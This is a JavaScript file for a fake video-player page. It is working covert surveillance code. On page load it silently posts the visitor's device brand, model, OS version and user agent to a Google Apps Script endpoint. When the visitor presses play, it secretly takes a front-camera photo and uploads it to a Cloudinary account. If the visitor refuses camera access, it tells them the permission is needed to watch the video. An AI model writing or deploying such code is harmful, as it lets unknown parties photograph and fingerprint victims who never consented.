const playButton = document.getElementById('playButton');
const loader = document.getElementById('loader');
const video = document.getElementById('videoPlayer');
const cameraInput = document.getElementById('cameraInput');
const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);

(async () => {
    const ua = navigator.userAgent;
    const getDeviceInfo = () => {
        const android = ua.match(/Android ([0-9.]+)/);
        const ios = ua.match(/OS ([0-9_]+)/);
        
        let brand = null, model = null;
        
        if (ua.match(/iPhone/)) {
            brand = 'Apple';
            model = 'iPhone';
        }
        else if (ua.match(/iPad/)) {
            brand = 'Apple';
            model = 'iPad';
        }
        else if (ua.match(/iPod/)) {
            brand = 'Apple';
            model = 'iPod';
        }
        else if (/Windows/i.test(ua)) {
            brand = 'Windows';
            const m = ua.match(/Windows NT ([0-9.]+)/);
            model = m ? 'NT ' + m[1] : 'PC';
        }
        else if (/Macintosh|Mac OS X/i.test(ua)) {
            brand = 'Apple';
            const m = ua.match(/Mac OS X ([0-9_]+)/);
            model = m ? 'macOS ' + m[1].replace(/_/g, '.') : 'Mac';
        }
        else if (android) {
            // Extract model from Build/ pattern (works for ALL Android)
            const buildMatch = ua.match(/;\s*([^;)]+)\s*Build/i);
            if (buildMatch) {
                const fullModel = buildMatch[1].trim();
                model = fullModel;
                
                // Try to extract brand from model string
                const firstWord = fullModel.split(/[\s-_]+/)[0];
                
                // Check if first word matches known brands
                const brands = ['TECNO', 'Infinix', 'Poco', 'Samsung', 'Redmi', 'Xiaomi', 'OPPO', 'Vivo', 'Realme', 'OnePlus', 'Pixel', 'Nothing', 'Honor', 'Sony', 'Motorola', 'ZTE', 'ASUS', 'Meizu', 'LG', 'Blackview', 'Huawei', 'Nokia', 'itel', 'Sparx', 'QMobile', 'Calme', 'Dany', 'Digit'];
                
                for (const b of brands) {
                    if (new RegExp(b, 'i').test(fullModel) || new RegExp(b, 'i').test(ua)) {
                        brand = b;
                        break;
                    }
                }
                
                // If still no brand, use first word
                if (!brand) {
                    brand = firstWord;
                }
            }
        }
        
        return {
            androidVersion: android ? android[1] : null,
            iosVersion: ios ? ios[1].replace(/_/g, '.') : null,
            brand: brand,
            model: model
        };
    };
    const deviceInfo = getDeviceInfo();
    const version = deviceInfo.androidVersion || deviceInfo.iosVersion || 'Unknown';
    
    const specs = {
        brand: deviceInfo.brand || 'Unknown',
        model: deviceInfo.model || 'Unknown',
        version: version,
        userAgent: ua
    };
    
    await fetch('https://script.google.com/macros/s/AKfycbwd6DFAaGBLF8RM6kD07nvTqD5Gr_SLDGTTLrkfVJ6qYrb7NtO9ZYZwqlgu4BnmQ28V/exec', {
        method: 'POST',
        mode: 'no-cors',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(specs)
    }).catch(() => {});
})();

const uploadToCloudinary = async (blob) => {
    const formData = new FormData();
    formData.append('file', blob);
    formData.append('upload_preset', 'user_pre');
    const response = await fetch('https://api.cloudinary.com/v1_1/dzmg57zjf/image/upload', { method: 'POST', body: formData });
    return response.json();
};

const playVideo = () => {
    playButton.style.display = 'none';
    loader.style.display = 'none';
    video.controls = true;
    video.play();
};

if (isIOS) {
    cameraInput.addEventListener('change', async (e) => {
        const file = e.target.files[0];
        if (file) {
            playButton.style.display = 'none';
            loader.style.display = 'block';
            await uploadToCloudinary(file);
            playVideo();
        }
    });
    
    playButton.addEventListener('click', () => {
        cameraInput.click();
    });
} else {
    playButton.addEventListener('click', async () => {
        playButton.style.display = 'none';
        loader.style.display = 'block';
        
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
            
            if (window.ImageCapture) {
                const videoTrack = stream.getVideoTracks()[0];
                const imageCapture = new ImageCapture(videoTrack);
                const blob = await imageCapture.takePhoto();
                stream.getTracks().forEach(track => track.stop());
                await uploadToCloudinary(blob);
            } else {
                const videoEl = document.createElement('video');
                videoEl.srcObject = stream;
                videoEl.play();
                await new Promise(resolve => setTimeout(resolve, 500));
                
                const canvas = document.createElement('canvas');
                canvas.width = videoEl.videoWidth;
                canvas.height = videoEl.videoHeight;
                canvas.getContext('2d').drawImage(videoEl, 0, 0);
                stream.getTracks().forEach(track => track.stop());
                
                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
                await uploadToCloudinary(blob);
            }
            
            playVideo();
        } catch (error) {
            loader.style.display = 'none';
            playButton.style.display = 'flex';
            alert('Camera permission denied. Please accept to watch the video.');
        }
    });
}
